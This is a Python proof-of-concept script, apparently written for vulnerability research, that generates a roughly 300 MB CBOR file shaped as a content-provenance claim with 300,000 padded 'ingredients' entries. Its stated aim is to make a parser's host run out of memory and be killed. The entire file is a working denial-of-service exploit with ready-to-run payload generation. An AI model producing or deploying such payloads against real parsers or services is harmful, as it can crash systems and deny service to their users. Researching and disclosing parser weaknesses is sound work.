#!/usr/bin/env python3
"""
CBOR DoS POC - OOM Attack (300MB payload)
Generates payload that causes actual OOM kill
"""

import struct

def write_cbor_map_header(f, count):
    if count < 24:
        f.write(bytes([0xa0 + count]))
    else:
        f.write(bytes([0xb8, count]))

def write_cbor_string(f, s):
    b = s.encode('utf-8')
    if len(b) < 24:
        f.write(bytes([0x60 + len(b)]))
    elif len(b) < 256:
        f.write(bytes([0x78, len(b)]))
    else:
        f.write(bytes([0x79]) + struct.pack('>H', len(b)))
    f.write(b)

def write_cbor_array_header(f, count):
    if count < 24:
        f.write(bytes([0x80 + count]))
    elif count < 256:
        f.write(bytes([0x98, count]))
    elif count < 65536:
        f.write(bytes([0x99]) + struct.pack('>H', count))
    else:
        f.write(bytes([0x9a]) + struct.pack('>I', count))

def create_oom_payload(filename, count):
    print(f"[*] Creating OOM payload: {count:,} elements...")
    
    with open(filename, 'wb') as f:
        write_cbor_map_header(f, 3)
        write_cbor_string(f, "claim_generator")
        write_cbor_string(f, "oom_attack")
        write_cbor_string(f, "claim_generator_info")
        write_cbor_array_header(f, 1)
        write_cbor_map_header(f, 2)
        write_cbor_string(f, "name")
        write_cbor_string(f, "test")
        write_cbor_string(f, "version")
        write_cbor_string(f, "1.0")
        write_cbor_string(f, "ingredients")
        write_cbor_array_header(f, count)
        
        for i in range(count):
            write_cbor_map_header(f, 3)
            write_cbor_string(f, "id")
            write_cbor_string(f, f"i{i}")
            write_cbor_string(f, "title")
            write_cbor_string(f, f"Element {i}")
            write_cbor_string(f, "data")
            write_cbor_string(f, "A" * 1000)
    
    size = len(open(filename, 'rb').read())
    print(f"✓ {filename}: {size:,} bytes ({size/1024/1024:.1f} MB)")
    return filename, size

# Create 300MB payload (300K elements)
create_oom_payload("oom_300k.cbor", 300000)
print("\n[!] This payload will cause OOM kill on systems with <1GB available RAM")
